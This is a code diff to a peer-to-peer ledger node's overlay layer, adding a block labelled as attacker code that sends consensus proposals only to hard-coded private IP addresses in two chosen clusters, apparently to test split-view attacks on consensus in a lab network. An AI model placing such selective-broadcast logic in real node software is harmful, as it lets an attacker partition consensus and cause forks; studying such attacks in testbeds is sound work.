@@ -1122,6 +1122,36 @@ OverlayImpl::send (protocol::TMProposeSet& m)
         p->send(sm);
     });
 }
+// Start attacker code
+void
+OverlayImpl::send (protocol::TMProposeSet& m, int cluster_idx)
+{
+    if (setup_.expire)
+        m.set_hops(0);
+    auto const sm = std::make_shared<Message>(m, protocol::mtPROPOSE_LEDGER);
+
+    for_each([&](std::shared_ptr<PeerImp>&& p)
+    {
+        auto peer_endpoint = p->getRemoteAddress();
+        std::string addressString = peer_endpoint.address().to_string();
+        if (     cluster_idx == 1 &&    // Send to network cluster 1
+            (   (strcmp(addressString.c_str(), "10.5.1.1") == 0) || 
+                (strcmp(addressString.c_str(), "10.5.1.2") == 0) || 
+                (strcmp(addressString.c_str(), "10.5.1.3") == 0) )) {
+            JLOG(journal_.warn()) << "OverlayImpl::relay: send prop to " << addressString;
+            p->send(sm);
+        }
+        if (     cluster_idx == 2 &&    // Send to network cluster 2
+            (   (strcmp(addressString.c_str(), "10.5.1.4") == 0) || 
+                (strcmp(addressString.c_str(), "10.5.1.5") == 0) || 
+                (strcmp(addressString.c_str(), "10.5.1.6") == 0) )) {
+            JLOG(journal_.warn()) << "OverlayImpl::relay: send prop to " << addressString;
+            p->send(sm);
+        }
+    });
+}
+// End attacker code
+
 void
 OverlayImpl::send (protocol::TMValidation& m)
 {
